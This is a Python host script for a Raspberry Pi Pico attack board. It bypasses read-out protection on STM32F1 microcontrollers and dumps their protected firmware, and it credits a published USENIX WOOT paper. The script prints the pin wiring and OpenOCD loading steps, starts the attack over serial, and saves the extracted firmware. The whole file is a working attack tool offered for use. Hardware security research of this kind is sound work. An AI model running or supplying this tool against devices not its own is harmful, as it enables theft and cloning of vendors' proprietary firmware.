# Copyright (C) 2023 Patrick Pedersen

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# The following script launches the attack on the Pi Pico against the
# STM32F1 target and dumps the fimrware to stdout and optionally a file
# (see -o option) upon success.

# This attack is based on the works of:
#  Johannes Obermaier, Marc Schink and Kosma Moczek
# The relevant paper can be found here, particularly section H3:
#  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
# And the relevant code can be found here:
#  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
#

# Dependencies:
#  - pyserial

import argparse
import time
from serial import Serial

BAUDRATE = 9600
SCRIPT_VERSION = "1.0"
REQ_ATTACK_BOARD_VERSION = "1.x"

parser = argparse.ArgumentParser(description="")
parser.add_argument("-o", "--output", help="Output file")
parser.add_argument(
    "-i", "--instructions", help="Print instructions and exit", action="store_true"
)
parser.add_argument(
    "-p",
    "--port",
    help="Serial port of Pi Pico",
    required=False,
    default="/dev/ttyACM0",
)
args = parser.parse_args()

print("")
print(
    "  ▄███████▄  ▄█   ▄████████  ▄██████▄          ▄███████▄  ▄█     █▄  ███▄▄▄▄      ▄████████    ▄████████ "
)
print(
    " ███    ███ ███  ███    ███ ███    ███        ███    ███ ███     ███ ███▀▀▀██▄   ███    ███   ███    ███ "
)
print(
    " ███    ███ ███▌ ███    █▀  ███    ███        ███    ███ ███     ███ ███   ███   ███    █▀    ███    ███ "
)
print(
    " ███    ███ ███▌ ███        ███    ███        ███    ███ ███     ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ "
)
print(
    "▀█████████▀ ███▌ ███        ███    ███       ▀█████████▀ ███     ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   "
)
print(
    " ███        ███  ███    █▄  ███    ███        ███        ███     ███ ███   ███   ███    █▄  ▀███████████ "
)
print(
    " ███        ███  ███    ███ ███    ███        ███        ███ ▄█▄ ███ ███   ███   ███    ███   ███    ███ "
)
print(
    "▄████▀      █▀   ████████▀   ▀██████▀        ▄████▀       ▀███▀███▀   ▀█   █▀    ██████████   ███    ███ "
)
print(
    "                                                                                              ███    ███ "
)

print("Credits: Johannes Obermaier, Marc Schink and Kosma Moczek")
print("Author: Patrick Pedersen <ctx.xda@gmail.com>")
print("Script Version: " + SCRIPT_VERSION)
print("Requires Attack-Board Firmware Version: " + REQ_ATTACK_BOARD_VERSION)

print("")
print("Instructions:")
print("1. Flash the attack firmware to the Pi Pico")
print("2. Connect the Pi Pico to the STM32F1 target as follows (left Pico, right STM):")
print("    GND -> GND     ")
print("     0  -> UART0 RX")
print("     1  -> UART0 TX")
print("     2  -> 3V3     ")
print("     4  -> NRST    ")
print("     5  -> BOOT0   ")
print("3. Connect a debug probe to the STM32F1 target")
print("4. Via openocd, load the target firmware to SRAM via the following command:")
print("   > load_image targetfw/targetfw.bin 0x20000000")
print("5. Disconnect the debug probe")
print(
    "6. Once ready, press enter to start dumping the firmware. This will take a while"
)
print("For more detailed steps, see the README.md file.")
print("")

if args.instructions:
    exit(0)

# If no output file is specified, forward output to /dev/null
fname = args.output
if fname is None:
    print("WARNING: No output file specified, dumping to /dev/null")
    fname = "/dev/null"

print("Waiting for Pi Pico to be connected... (Looking for " + args.port + ")")

# Wait for serial port to be available
while True:
    try:
        ser = Serial(args.port, BAUDRATE)
        break
    except:
        time.sleep(1)
        continue
    break

if ser.isOpen():
    print("Connected to serial port " + args.port)
else:
    print("Failed to open serial port")
    exit(1)

with open(fname, "wb") as f:
    # Wait for user input to launch attack
    print("")
    print("Press any key to start dumping firmware")
    input()
    ser.write(b"1")

    # Enable timeout as we'll use this to detect when the attack is done
    ser.timeout = 10

    i = 0  # Counter for pretty printing

    while True:
        data = ser.read()

        if len(data) == 0:
            break

        f.write(data)

        # Convert to hex string and print
        data = data.hex()
        print(" " + data, end="")

        # Beak line every 16 bytes
        i += 1
        if i % 16 == 0:
            print()

    print("\nDone")

    if fname != "/dev/null":
        print("Firmware dumped to " + fname)

ser.close()
